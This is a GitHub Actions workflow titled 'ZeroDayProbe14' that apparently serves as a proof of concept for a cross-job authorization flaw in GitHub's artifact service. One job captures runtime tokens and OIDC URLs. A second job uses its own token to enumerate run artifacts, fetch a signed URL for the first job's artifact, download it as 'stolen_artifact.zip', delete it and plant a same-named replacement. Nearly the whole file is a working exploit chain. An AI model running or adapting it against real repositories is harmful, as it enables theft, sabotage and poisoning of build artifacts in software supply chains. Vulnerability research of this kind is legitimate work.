name: ZeroDayProbe14
on:
  push:
    branches: [main]
permissions:
  contents: read
  id-token: write

jobs:
  job-a:
    runs-on: ubuntu-latest
    outputs:
      plan_id: ${{ steps.ids.outputs.plan_id }}
      job_id: ${{ steps.ids.outputs.job_id }}
    steps:
      - name: Grab job-A token
        id: ids
        uses: actions/github-script@v7
        with:
          github-token: ${{ github.token }}
          script: |
            const fs = require('fs');
            const rt = process.env.ACTIONS_RUNTIME_TOKEN || '';
            const oidcUrl = process.env.ACTIONS_ID_TOKEN_REQUEST_URL || '';
            const resultsUrl = process.env.ACTIONS_RESULTS_URL || '';
            fs.writeFileSync('/tmp/ZD_A_RT.txt', rt);
            fs.writeFileSync('/tmp/ZD_A_OIDC_URL.txt', oidcUrl);
            fs.writeFileSync('/tmp/ZD_A_RESULTS_URL.txt', resultsUrl);
            const m = oidcUrl.match(/idtoken\/([^\/]+)\/([^?]+)/);
            core.setOutput('plan_id', m ? m[1] : '');
            core.setOutput('job_id', m ? m[2] : '');
            core.info(`A_PLAN=${m ? m[1] : ''} A_JOB=${m ? m[2] : ''}`);

      - name: Upload sensitive artifact (simulates secrets/build output)
        uses: actions/upload-artifact@v4
        with:
          name: sensitive-build-output
          path: /tmp/ZD_A_OIDC_URL.txt

      - name: Write IDs for job-B
        run: |
          RT=$(cat /tmp/ZD_A_RT.txt)
          OIDC=$(cat /tmp/ZD_A_OIDC_URL.txt)
          RESULTS=$(cat /tmp/ZD_A_RESULTS_URL.txt)
          A_PLAN=$(echo "$OIDC" | grep -oE 'idtoken/[^/]+' | cut -d/ -f2)
          A_JOB=$(echo "$OIDC" | grep -oE 'idtoken/[^/]+/[^?]+' | cut -d/ -f3)
          printf 'PLAN_ID=%s\nJOB_ID=%s\nRESULTS_URL=%s\n' "$A_PLAN" "$A_JOB" "$RESULTS" > /tmp/job_a_ids.txt

      - name: Upload job-A IDs
        uses: actions/upload-artifact@v4
        with:
          name: job-a-ids
          path: /tmp/job_a_ids.txt

  job-b:
    runs-on: ubuntu-latest
    needs: job-a
    steps:
      - name: Grab job-B token
        uses: actions/github-script@v7
        with:
          github-token: ${{ github.token }}
          script: |
            const fs = require('fs');
            const rt = process.env.ACTIONS_RUNTIME_TOKEN || '';
            const oidcUrl = process.env.ACTIONS_ID_TOKEN_REQUEST_URL || '';
            const resultsUrl = process.env.ACTIONS_RESULTS_URL || '';
            fs.writeFileSync('/tmp/ZD_B_RT.txt', rt);
            fs.writeFileSync('/tmp/ZD_B_OIDC_URL.txt', oidcUrl);
            fs.writeFileSync('/tmp/ZD_B_RESULTS_URL.txt', resultsUrl);
            const m = oidcUrl.match(/idtoken\/([^\/]+)\/([^?]+)/);
            core.info(`B_PLAN=${m ? m[1] : ''} B_JOB=${m ? m[2] : ''}`);

      - name: Download job-A IDs
        uses: actions/download-artifact@v4
        with:
          name: job-a-ids
          path: /tmp/job_a_data/

      - name: Supply chain poison test + full PoC chain
        run: |
          RT_B=$(cat /tmp/ZD_B_RT.txt)
          B_OIDC=$(cat /tmp/ZD_B_OIDC_URL.txt)
          RESULTS_URL=$(cat /tmp/ZD_B_RESULTS_URL.txt)
          B_PLAN=$(echo "$B_OIDC" | grep -oE 'idtoken/[^/]+' | cut -d/ -f2)
          B_JOB=$(echo "$B_OIDC" | grep -oE 'idtoken/[^/]+/[^?]+' | cut -d/ -f3)
          A_PLAN=$(grep "^PLAN_ID=" /tmp/job_a_data/job_a_ids.txt | cut -d= -f2-)
          A_JOB=$(grep "^JOB_ID=" /tmp/job_a_data/job_a_ids.txt | cut -d= -f2-)
          echo "B_PLAN=$B_PLAN B_JOB=$B_JOB"
          echo "A_PLAN=$A_PLAN A_JOB=$A_JOB"
          echo "SAME_PLAN=$([ "$A_PLAN" = "$B_PLAN" ] && echo YES || echo NO)"

          echo "=CHAIN_STEP1_ENUMERATE="
          # Step 1: Enumerate all artifacts in the run using own credentials
          LIST_RESP=$(curl -s -X POST "${RESULTS_URL}twirp/github.actions.results.api.v1.ArtifactService/ListArtifacts" \
            -H "Authorization: Bearer $RT_B" -H "Content-Type: application/json" \
            -d "{\"workflowRunBackendId\":\"$B_PLAN\",\"workflowJobRunBackendId\":\"$B_JOB\"}")
          echo "ListArtifacts own (returns ALL run artifacts): HTTP=?"
          curl -s -w "\nHTTP=%{http_code}" -X POST "${RESULTS_URL}twirp/github.actions.results.api.v1.ArtifactService/ListArtifacts" \
            -H "Authorization: Bearer $RT_B" -H "Content-Type: application/json" \
            -d "{\"workflowRunBackendId\":\"$B_PLAN\",\"workflowJobRunBackendId\":\"$B_JOB\"}"
          echo ""

          echo "=CHAIN_STEP2_GET_SIGNED_URL="
          # Step 2: Get signed URL for job-A's sensitive artifact
          SIGNED_RESP=$(curl -s -w "\nHTTP=%{http_code}" -X POST "${RESULTS_URL}twirp/github.actions.results.api.v1.ArtifactService/GetSignedArtifactURL" \
            -H "Authorization: Bearer $RT_B" -H "Content-Type: application/json" \
            -d "{\"workflowRunBackendId\":\"$A_PLAN\",\"workflowJobRunBackendId\":\"$A_JOB\",\"name\":\"sensitive-build-output\"}")
          echo "GetSignedArtifactURL cross-job:"
          echo "$SIGNED_RESP"
          # Extract the signed URL
          SIGNED_URL=$(echo "$SIGNED_RESP" | grep -o '"signed_url":"[^"]*"' | cut -d'"' -f4)
          echo "SIGNED_URL_EXTRACTED=$([ -n "$SIGNED_URL" ] && echo YES || echo NO)"

          echo "=CHAIN_STEP3_DOWNLOAD="
          # Step 3: Actually download the artifact content
          if [ -n "$SIGNED_URL" ]; then
            echo "Downloading artifact via SAS URL..."
            curl -s -w "\nDOWNLOAD_HTTP=%{http_code}" -o /tmp/stolen_artifact.zip "$SIGNED_URL"
            echo ""
            echo "Downloaded file size: $(wc -c < /tmp/stolen_artifact.zip 2>/dev/null || echo 0) bytes"
            ls -la /tmp/stolen_artifact.zip 2>/dev/null || echo "File not found"
          else
            echo "No signed URL to download"
          fi

          echo "=CHAIN_STEP4_DELETE="
          # Step 4: Delete the artifact (supply chain sabotage)
          echo "Deleting sensitive-build-output from job-A:"
          curl -s -w "\nHTTP=%{http_code}" -X POST "${RESULTS_URL}twirp/github.actions.results.api.v1.ArtifactService/DeleteArtifact" \
            -H "Authorization: Bearer $RT_B" -H "Content-Type: application/json" \
            -d "{\"workflowRunBackendId\":\"$A_PLAN\",\"workflowJobRunBackendId\":\"$A_JOB\",\"name\":\"sensitive-build-output\"}"
          echo ""

          echo "=CHAIN_STEP5_POISON_CREATE="
          # Step 5: Try to create a replacement artifact with same name in job-A's namespace (supply chain poison)
          echo "CreateArtifact in job-A namespace (supply chain poison attempt):"
          curl -s -w "\nHTTP=%{http_code}" -X POST "${RESULTS_URL}twirp/github.actions.results.api.v1.ArtifactService/CreateArtifact" \
            -H "Authorization: Bearer $RT_B" -H "Content-Type: application/json" \
            -d "{\"workflowRunBackendId\":\"$A_PLAN\",\"workflowJobRunBackendId\":\"$A_JOB\",\"name\":\"sensitive-build-output\",\"version\":4}"
          echo ""

          # Step 5b: Can we create with OWN job IDs but same name? (Name collision)
          echo "CreateArtifact own namespace same name (name collision test):"
          curl -s -w "\nHTTP=%{http_code}" -X POST "${RESULTS_URL}twirp/github.actions.results.api.v1.ArtifactService/CreateArtifact" \
            -H "Authorization: Bearer $RT_B" -H "Content-Type: application/json" \
            -d "{\"workflowRunBackendId\":\"$B_PLAN\",\"workflowJobRunBackendId\":\"$B_JOB\",\"name\":\"sensitive-build-output\",\"version\":4}"
          echo ""

          echo "=CHAIN_COMPLETE="
